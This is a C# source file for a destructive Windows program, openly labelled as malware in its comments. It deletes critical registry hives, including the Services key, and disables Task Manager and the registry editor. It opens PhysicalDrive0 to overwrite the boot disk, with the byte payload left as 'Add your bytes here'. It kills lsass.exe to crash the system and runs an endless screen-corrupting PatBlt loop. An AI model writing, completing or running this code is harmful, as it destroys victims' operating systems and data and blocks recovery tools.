using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;

class Program
{
    // P/Invoke declarations
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateFileW(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("user32.dll")]
    static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    static extern int GetSystemMetrics(int nIndex);

    [DllImport("gdi32.dll")]
    static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);

    [DllImport("gdi32.dll")]
    static extern IntPtr CreateSolidBrush(uint color);

    [DllImport("gdi32.dll")]
    static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

    [DllImport("gdi32.dll")]
    static extern bool DeleteObject(IntPtr hObject);

    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);

    // Constants
    const uint GENERIC_WRITE = 0x40000000;
    const uint FILE_SHARE_READ = 0x00000001;
    const uint FILE_SHARE_WRITE = 0x00000002;
    const uint OPEN_EXISTING = 0x00000003;
    const uint PATINVERT = 0x005A0049;
    const uint RGB = 0x0000C800; // Blue color in RGB

    static void Main(string[] args)
    {
        // Run subprocesses
        RunSubprocesses();

        // Registry operations
        RegistryWrite();

        // Malware execution (Warning: Potentially malicious code)
        MalwareExecution();

        // GUI operations
        GUIOperations();

        // Random BitBlt operations
        RandomBitBlt();
    }

    static void RunSubprocesses()
    {
        Process.Start(new ProcessStartInfo("reg", "delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion /f")
        {
            UseShellExecute = false,
            CreateNoWindow = true
        }).WaitForExit();

        Process.Start(new ProcessStartInfo("reg", "delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services /f")
        {
            UseShellExecute = false,
            CreateNoWindow = true
        }).WaitForExit();

        Process.Start(new ProcessStartInfo("reg", "delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion /f")
        {
            UseShellExecute = false,
            CreateNoWindow = true
        }).WaitForExit();
    }

    static void RegistryWrite()
    {
        // Disable Task Manager
        using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
        {
            key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
        }

        // Disable Registry Tools
        using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
        {
            key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
        }
    }

    static void MalwareExecution()
    {
        // Write data to PhysicalDrive0
        byte[] data = new byte[0]; // Add your bytes here
        for (int i = 0; i < 2; i++)
        {
            IntPtr hDevice = CreateFileW(@"\\.\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
            WriteFile(hDevice, data, (uint)data.Length, out _, IntPtr.Zero);
            CloseHandle(hDevice);
        }

        // Kill lsass.exe process (Warning: Dangerous operation)
        Process.Start(new ProcessStartInfo("taskkill", "/f /im lsass.exe")
        {
            UseShellExecute = false,
            CreateNoWindow = true
        });
    }

    static void GUIOperations()
    {
        IntPtr desk = GetDC(IntPtr.Zero);
        int x = GetSystemMetrics(0), y = GetSystemMetrics(1);

        for (int i = 0; i < 5; i++)
        {
            PatBlt(desk, x, y, 100, 100, PATINVERT);
            x += 10;
            y += 10;
        }

        Random rand = new Random();
        for (int i = 0; i < 100; i++)
        {
            IntPtr brush = CreateSolidBrush(RGB);
            IntPtr oldBrush = SelectObject(desk, brush);
            PatBlt(desk, rand.Next(x), rand.Next(y), rand.Next(x), rand.Next(y), PATINVERT);
            SelectObject(desk, oldBrush);
            DeleteObject(brush);
            Sleep(10);
        }
    }

    static void RandomBitBlt()
    {
        Random rand = new Random();
        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int screenWidth = GetSystemMetrics(0);
            int screenHeight = GetSystemMetrics(1);

            int x = rand.Next(0, screenWidth);
            int y = rand.Next(0, screenHeight);
            int y1 = rand.Next(y - 10, y + 10);
            int v4 = rand.Next(0, 100);

            PatBlt(hdc, x, y, 200, 200, PATINVERT);
            Sleep(1000);
        }
    }
}
